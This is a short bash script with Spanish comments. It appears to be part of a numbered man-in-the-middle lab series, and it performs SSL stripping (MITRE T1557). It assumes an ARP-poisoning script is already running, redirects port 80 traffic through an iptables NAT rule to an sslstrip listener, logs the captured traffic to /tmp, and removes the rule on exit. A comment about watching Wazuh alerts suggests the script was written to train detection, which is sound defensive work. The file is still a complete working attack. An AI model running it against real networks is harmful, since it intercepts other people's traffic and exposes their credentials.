#!/bin/bash
# 05_ssl_strip.sh - SSL Stripping
# MITRE ATT&CK T1557 downgrade
# Requiere: 02_arp_poison.sh activo
source /opt/mitm-scripts/targets.sh

LISTEN_PORT="${1:-8080}"

echo "[*] === SSL STRIP ==="
echo "[*] Puerto: $LISTEN_PORT"
echo "[!] PREREQUISITO: 02_arp_poison.sh activo"
echo "[!] Observa alertas en Wazuh: SID 9000007"
echo ""

iptables -t nat -A PREROUTING -p tcp \
  --destination-port 80 -j REDIRECT --to-port $LISTEN_PORT

echo "[*] Iniciando sslstrip..."
sslstrip -l $LISTEN_PORT \
  -w /tmp/sslstrip_$(date +%Y%m%d_%H%M%S).log

trap "iptables -t nat -D PREROUTING -p tcp \
      --destination-port 80 -j REDIRECT \
      --to-port $LISTEN_PORT 2>/dev/null
      echo '[*] Limpieza completada'" EXIT
